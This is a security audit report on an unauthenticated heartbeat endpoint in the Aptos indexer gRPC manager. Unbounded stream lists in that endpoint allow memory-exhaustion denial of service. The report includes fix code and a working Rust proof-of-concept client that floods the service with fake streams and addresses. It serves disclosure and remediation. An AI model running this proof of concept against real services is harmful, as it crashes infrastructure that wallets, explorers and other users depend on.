# Audit Report

## Title
Unbounded Memory Exhaustion via Malicious StreamInfo in GrpcManager Heartbeat Endpoint

## Summary
The GrpcManager service accepts unauthenticated heartbeat requests containing arbitrary `LiveDataServiceInfo` with unbounded `active_streams` vectors. An attacker can send heartbeats with millions of fake `ActiveStream` entries to exhaust memory and crash the indexer-grpc-manager service, disrupting the entire Aptos indexer infrastructure.

## Finding Description

The vulnerability exists in the indexer-grpc-manager component, which provides critical infrastructure for the Aptos ecosystem by coordinating data services for blockchain indexing.

**Attack Flow:**

1. The `GrpcManager` service exposes a `heartbeat` RPC endpoint without authentication [1](#0-0) 

2. Any client can send `HeartbeatRequest` messages containing `LiveDataServiceInfo` with a `StreamInfo` field [2](#0-1) 

3. The `StreamInfo.active_streams` field is a repeated protobuf field with no size validation beyond the 256MB gRPC message limit [3](#0-2) 

4. The `handle_live_data_service_info` function stores the entire `LiveDataServiceInfo` (including all `active_streams`) in memory without validation [4](#0-3) 

5. Each unique address can store up to 100 historical states [5](#0-4) 

6. Services are stored in an unbounded `DashMap` with no limit on the number of distinct addresses [6](#0-5) 

**Exploitation Steps:**

1. Attacker crafts gRPC clients that connect to the GrpcManager service
2. Sends heartbeat requests with different fake addresses (e.g., `fake-service-1.example.com`, `fake-service-2.example.com`, etc.)
3. Each heartbeat contains `LiveDataServiceInfo` with `stream_info.active_streams` filled to near the 256MB message limit
4. Each `ActiveStream` can also include `StreamProgress` with multiple samples, maximizing memory consumption
5. Repeats heartbeats every 5 seconds to prevent the 60-second cleanup timeout [7](#0-6) 
6. With 100 fake addresses × 100 states × 256MB = 2.56 TB of memory allocation

The vulnerability breaks the **Resource Limits invariant**: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This is a **High Severity** vulnerability per the Aptos bug bounty program criteria:
- **"API crashes"**: The indexer-grpc-manager can be crashed via OOM, making it unavailable
- **"Validator node slowdowns"**: While not directly affecting consensus validators, the indexer infrastructure is critical for ecosystem participants

The impact includes:
- Memory exhaustion leading to process crash or OOM kill
- Complete unavailability of the indexer-grpc-manager service
- Disruption to all downstream indexer clients (wallets, explorers, dApps)
- Potential cascading failures in dependent services
- Service recovery requires manual intervention and restart

This does NOT affect consensus safety or validator operations, but critically impacts the broader Aptos ecosystem infrastructure.

## Likelihood Explanation

**Likelihood: High**

The attack requires:
- ✓ Network access to the GrpcManager service (publicly exposed)
- ✓ No authentication or authorization credentials
- ✓ Basic gRPC client implementation (trivial with tonic/grpcurl)
- ✓ No special privileges or insider access required

The attack is:
- **Easy to execute**: Simple gRPC client script
- **Low cost**: Minimal bandwidth (256MB per heartbeat)
- **High impact**: Complete service disruption
- **Difficult to detect**: Appears as legitimate heartbeat traffic until memory exhaustion
- **No defensive mechanisms**: No rate limiting, no address validation, no size limits

## Recommendation

Implement multiple defense layers:

1. **Authentication**: Require mutual TLS or token-based authentication for heartbeat endpoints
2. **Size Limits**: Enforce maximum limits on `active_streams` count per heartbeat
3. **Address Validation**: Verify that heartbeat senders actually control the claimed addresses
4. **Rate Limiting**: Limit heartbeats per address and total heartbeats per time window
5. **Service Limits**: Cap the total number of registered services in the DashMap

**Suggested code fix for metadata_manager.rs:**

```rust
const MAX_ACTIVE_STREAMS_PER_SERVICE: usize = 1000;
const MAX_REGISTERED_SERVICES: usize = 100;

fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate active_streams count
    if let Some(stream_info) = &info.stream_info {
        if stream_info.active_streams.len() > MAX_ACTIVE_STREAMS_PER_SERVICE {
            bail!("Too many active streams: {}", stream_info.active_streams.len());
        }
    }
    
    // Validate total number of services
    if !self.live_data_services.contains_key(&address) 
        && self.live_data_services.len() >= MAX_REGISTERED_SERVICES {
        bail!("Maximum number of services reached");
    }
    
    // Existing code...
    let mut entry = self
        .live_data_services
        .entry(address.clone())
        .or_insert(LiveDataService::new(address));
    // ... rest of function
}
```

Additionally, implement authentication in `service.rs`:

```rust
async fn heartbeat(
    &self,
    request: Request<HeartbeatRequest>,
) -> Result<Response<HeartbeatResponse>, Status> {
    // Add authentication check
    self.validate_heartbeat_auth(&request)?;
    
    // Existing code...
}
```

## Proof of Concept

```rust
// PoC: Malicious gRPC client to exhaust GrpcManager memory
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    ActiveStream, LiveDataServiceInfo, HeartbeatRequest,
    ServiceInfo, StreamInfo, StreamProgress, StreamProgressSampleProto,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to GrpcManager (no authentication required)
    let channel = Channel::from_static("http://grpc-manager:50051")
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);
    
    // Create malicious payload with millions of fake streams
    let mut active_streams = Vec::new();
    for i in 0..1_000_000 {
        active_streams.push(ActiveStream {
            id: format!("fake-stream-{}", i),
            start_time: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
            start_version: i,
            end_version: None,
            progress: Some(StreamProgress {
                samples: vec![StreamProgressSampleProto {
                    timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                    version: i,
                    size_bytes: 1000,
                }],
            }),
        });
    }
    
    // Send heartbeats with different fake addresses
    for addr_id in 0..100 {
        let request = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(format!("fake-service-{}.example.com:50052", addr_id)),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                    known_latest_version: Some(1000000),
                    stream_info: Some(StreamInfo {
                        active_streams: active_streams.clone(),
                    }),
                    min_servable_version: Some(0),
                })),
            }),
        };
        
        println!("Sending malicious heartbeat for address {}", addr_id);
        let _ = client.heartbeat(request).await;
        
        // Keep services alive by repeating heartbeats
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
    
    // Monitor memory exhaustion...
    println!("Attack in progress. GrpcManager memory consumption increasing...");
    Ok(())
}
```

**Expected Result**: The GrpcManager process memory grows to several GB and eventually crashes with OOM error, making the service unavailable.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L31-42)
```text
message StreamInfo {
  repeated ActiveStream active_streams = 1;
}

message LiveDataServiceInfo {
  uint64 chain_id = 1;
  optional aptos.util.timestamp.Timestamp timestamp = 2;
  optional uint64 known_latest_version = 3;
  optional StreamInfo stream_info = 4;
  // If not present, it means the data service is not available to serve anything yet.
  optional uint64 min_servable_version = 5;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L36-37)
```rust
// The maximum # of states for each service we keep.
const MAX_NUM_OF_STATES_TO_KEEP: usize = 100;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L132-132)
```rust
    live_data_services: DashMap<GrpcAddress, LiveDataService>,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L219-224)
```rust
                    let unreachable = live_data_service.recent_states.back().is_some_and(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(60),
                        )
                    });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
